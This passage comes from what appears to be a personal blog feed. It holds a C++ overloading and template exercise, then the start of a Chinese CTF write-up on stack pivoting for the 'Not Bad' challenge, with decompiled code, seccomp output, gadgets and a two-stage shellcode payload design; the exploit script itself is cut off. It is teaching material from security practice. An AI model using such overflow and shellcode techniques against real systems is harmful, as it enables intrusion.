class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">float</span> a,<span class=\"type\">float</span> b)</span></span>;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(string a,string b)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(vector&lt;<span class=\"type\">float</span>&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(vector&lt;string&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">int</span>* a,<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">float</span>* a,<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(string* a,<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  string sarray[] = &#123;<span class=\"string\">&quot;we&quot;</span>,<span class=\"string\">&quot;were&quot;</span>,<span class=\"string\">&quot;her&quot;</span>,<span class=\"string\">&quot;pride&quot;</span>,<span class=\"string\">&quot;of&quot;</span>,<span class=\"string\">&quot;ten&quot;</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;string&gt; <span class=\"title\">svec</span><span class=\"params\">(sarray,sarray+<span class=\"number\">6</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">int</span> iarray[] = &#123;<span class=\"number\">12</span>,<span class=\"number\">70</span>,<span class=\"number\">2</span>,<span class=\"number\">169</span>,<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">29</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">ivec</span><span class=\"params\">(iarray,iarray+<span class=\"number\">7</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">float</span> farray[] = &#123;<span class=\"number\">2.5</span>,<span class=\"number\">24.8</span>,<span class=\"number\">18.7</span>,<span class=\"number\">4.1</span>,<span class=\"number\">23.9</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">float</span>&gt; <span class=\"title\">fvec</span><span class=\"params\">(farray,farray+<span class=\"number\">5</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">int</span> imax = <span class=\"built_in\">max</span>(<span class=\"built_in\">max</span>(ivec),<span class=\"built_in\">max</span>(iarray,<span class=\"number\">7</span>));</span><br><span class=\"line\">  <span class=\"type\">float</span> fmax =  <span class=\"built_in\">max</span>(<span class=\"built_in\">max</span>(fvec),<span class=\"built_in\">max</span>(farray,<span class=\"number\">5</span>));</span><br><span class=\"line\">  string smax =  <span class=\"built_in\">max</span>(<span class=\"built_in\">max</span>(svec),<span class=\"built_in\">max</span>(sarray,<span class=\"number\">6</span>));</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;imax should be 169  -- found: &quot;</span> &lt;&lt; imax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">     \t &lt;&lt; <span class=\"string\">&quot;fmax should be 24.8 -- found: &quot;</span> &lt;&lt; fmax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">       &lt;&lt; <span class=\"string\">&quot;smax should be were -- found: &quot;</span> &lt;&lt; smax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">int</span> a,<span class=\"type\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> a&gt;b? a:b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">float</span> a,<span class=\"type\">float</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> a&gt;b? a:b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(string a,string b)</span>   <span class=\"comment\">//为什么要加const和&amp;呢?</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> a&gt;b? a:b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(vec.<span class=\"built_in\">begin</span>(),vec.<span class=\"built_in\">end</span>());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(vector&lt;<span class=\"type\">float</span>&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(vec.<span class=\"built_in\">begin</span>(),vec.<span class=\"built_in\">end</span>());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(vector&lt;string&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(vec.<span class=\"built_in\">begin</span>(),vec.<span class=\"built_in\">end</span>());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">int</span>* arr,<span class=\"type\">int</span> size)</span></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(arr,arr+size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">float</span> <span class=\"title\">max</span><span class=\"params\">(<span class=\"type\">float</span>* arr,<span class=\"type\">int</span> size)</span></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(arr,arr+size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">string <span class=\"title\">max</span><span class=\"params\">(string* arr,<span class=\"type\">int</span> size)</span></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(arr,arr+size);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在写这个程序的时候遇到了很多奇奇怪怪的小问题,都是对很多地方理解不到位,有时间了慢慢总结.</p>\n<h3 id=\"练习2-6\"><a href=\"#练习2-6\" class=\"headerlink\" title=\"练习2.6\"></a>练习2.6</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504214638446.png\" alt=\"image-20230504214638446\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">typename</span> Type&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> Type <span class=\"title\">max1</span><span class=\"params\">(Type a,Type b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a&gt;b? a:b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">typename</span> elemType&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> elemType <span class=\"title\">max1</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;elemType&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(vec.<span class=\"built_in\">begin</span>(),vec.<span class=\"built_in\">end</span>());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">typename</span> arrayType&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> arrayType <span class=\"title\">max1</span><span class=\"params\">(<span class=\"type\">const</span> arrayType *arr,<span class=\"type\">int</span> size)</span>  <span class=\"comment\">//注意*的位置,放前面不对??</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *<span class=\"built_in\">max_element</span>(arr,arr+size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  string sarray[] = &#123;<span class=\"string\">&quot;we&quot;</span>,<span class=\"string\">&quot;were&quot;</span>,<span class=\"string\">&quot;her&quot;</span>,<span class=\"string\">&quot;pride&quot;</span>,<span class=\"string\">&quot;of&quot;</span>,<span class=\"string\">&quot;ten&quot;</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;string&gt; <span class=\"title\">svec</span><span class=\"params\">(sarray,sarray+<span class=\"number\">6</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">int</span> iarray[] = &#123;<span class=\"number\">12</span>,<span class=\"number\">70</span>,<span class=\"number\">2</span>,<span class=\"number\">169</span>,<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">29</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">ivec</span><span class=\"params\">(iarray,iarray+<span class=\"number\">7</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">float</span> farray[] = &#123;<span class=\"number\">2.5</span>,<span class=\"number\">24.8</span>,<span class=\"number\">18.7</span>,<span class=\"number\">4.1</span>,<span class=\"number\">23.9</span>&#125;;</span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">float</span>&gt; <span class=\"title\">fvec</span><span class=\"params\">(farray,farray+<span class=\"number\">5</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"type\">int</span> imax = <span class=\"built_in\">max1</span>(<span class=\"built_in\">max1</span>(ivec),<span class=\"built_in\">max1</span>(iarray,<span class=\"number\">7</span>));</span><br><span class=\"line\">  <span class=\"type\">float</span> fmax =  <span class=\"built_in\">max1</span>(<span class=\"built_in\">max1</span>(fvec),<span class=\"built_in\">max1</span>(farray,<span class=\"number\">5</span>));</span><br><span class=\"line\">  string smax =  <span class=\"built_in\">max1</span>(<span class=\"built_in\">max1</span>(svec),<span class=\"built_in\">max1</span>(sarray,<span class=\"number\">6</span>));</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;imax should be 169  -- found: &quot;</span> &lt;&lt; imax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">     \t &lt;&lt; <span class=\"string\">&quot;fmax should be 24.8 -- found: &quot;</span> &lt;&lt; fmax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">       &lt;&lt; <span class=\"string\">&quot;smax should be were -- found: &quot;</span> &lt;&lt; smax &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>这里出现了一个奇怪的错误,网友也有很多遇到的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>c:<span class=\"number\">38</span>:<span class=\"number\">41</span>: error: call of overloaded ‘max(<span class=\"type\">int</span>, <span class=\"type\">int</span>)’ is ambiguous</span><br><span class=\"line\">   <span class=\"number\">38</span> |   <span class=\"type\">int</span> imax = max(max(ivec),max(iarray,<span class=\"number\">7</span>));</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://segmentfault.com/q/1010000019322724\">https://segmentfault.com/q/1010000019322724</a></p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/",
            "title": "pwn入门-24-栈迁移练习题3道",
            "date_published": "2023-04-10T03:48:31.000Z",
            "content_html": "<h1 id=\"1-极客大挑战-2019-Not-Bad\"><a href=\"#1-极客大挑战-2019-Not-Bad\" class=\"headerlink\" title=\"1.[极客大挑战 2019]Not Bad\"></a>1.[极客大挑战 2019]Not Bad</h1><h2 id=\"分析反编译代码及保护\"><a href=\"#分析反编译代码及保护\" class=\"headerlink\" title=\"分析反编译代码及保护\"></a>分析反编译代码及保护</h2><p>​\t\tUbuntu 18   2.23libc也就是说理论上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(<span class=\"built_in\">int</span> a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mmap((void *)<span class=\"number\">0x123000</span>, 0x1000uLL, <span class=\"number\">6</span>, <span class=\"number\">34</span>, -<span class=\"number\">1</span>, 0LL);</span><br><span class=\"line\">  sub_400949();</span><br><span class=\"line\">  sub_400906();</span><br><span class=\"line\">  sub_400A16();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> sub_400A16()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[<span class=\"number\">32</span>]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  puts(<span class=\"string\">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, 0x38uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset); 开始分配了一段空间,不知道干啥用的</p>\n<p>​\t\t然后安装了seccomp,设置io流,读入0x38 &#x3D; 56字节, 减去32 减去8rbp, 16个字节的溢出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># checksec bad</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/stackpivot/jikenotbad/bad&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x3ff000</span>)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\">    RUNPATH:  <span class=\"string\">b&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以写shellcode, orw读取flag, 写的话,直接是写入到了一开始mmap的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># seccomp-tools dump ./bad</span></span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> 0001: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x08</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0002: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> 0003: <span class=\"number\">0x35</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &lt; <span class=\"number\">0x40000000</span>) goto 0005</span><br><span class=\"line\"> 0004: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x05</span> <span class=\"number\">0xffffffff</span>  <span class=\"keyword\">if</span> (A != <span class=\"number\">0xffffffff</span>) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0005: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) goto 0009</span><br><span class=\"line\"> 0006: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000001</span>  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0007: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">open</span>) goto 0009</span><br><span class=\"line\"> 0008: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003c</span>  <span class=\"keyword\">if</span> (A != exit) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0009: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">00</span>10: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>​\t\t需要分两次利用,因为无法直接把payload写入0x123000,所以先构造一个读取的payload,读入第二阶段payload后,再跳转过去</p>\n<p>​\t\t1.先利用第一次read读取第一阶段shellcode并跳转到这里进行执行,这串shellcode是读取第二阶段orw的shellcode到0x123000并跳转到那里</p>\n<p>​\t\t具体而言,第一阶段payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) +p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)</p>\n<p>​\t\tjmp rsp相当于没干什么,只是跳到了下一条指令,但是如果没有这条指令,直接上汇编的话,识别不了,这里相当于给了一条指令的地址pop 出来的是指令的地址,jmp 过去的是可以直接执行的?</p>\n<p>​\t\tret的话,是pop rip,在返回地址处放上一条指令的地址才对,所以这里放了jmp_rsp,pop rip后rsp指向了 asm(‘sub rsp,0x30;jmp rsp’),jmp到这里才可以把这里的数据当成指令,然后正好可以继续执行指令</p>\n<p>​\t\t大概..需要补汇编基础了…</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410140744974.png\" alt=\"image-20230410140744974\" style=\"zoom:50%;\">\n\n<p>​\t\t2. 第一阶段的payload是读取第二阶段payload(orw)到0x123000,然后跳转过去</p>\n<h2 id=\"栈迁移\"><a href=\"#栈迁移\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># ROPgadget --binary bad  --only &#x27;jmp&#x27;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x000000000040078b</span> : jmp <span class=\"number\">0x400770</span></span><br><span class=\"line\"><span class=\"number\">0x00000000004008eb</span> : jmp <span class=\"number\">0x400880</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400b03</span> : jmp <span class=\"number\">0x400b7a</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400b87</span> : jmp qword ptr [rax - <span class=\"number\">0x68000000</span>]</span><br><span class=\"line\"><span class=\"number\">0x0000000000400ceb</span> : jmp qword ptr [rbp]</span><br><span class=\"line\"><span class=\"number\">0x0000000000400865</span> : jmp rax</span><br><span class=\"line\"><span class=\"number\">0x0000000000400a01</span> : jmp rsp</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里用到了jmp 这个转移的办法</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>exp一定要加上架构,不然报错,因为要进行汇编</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span 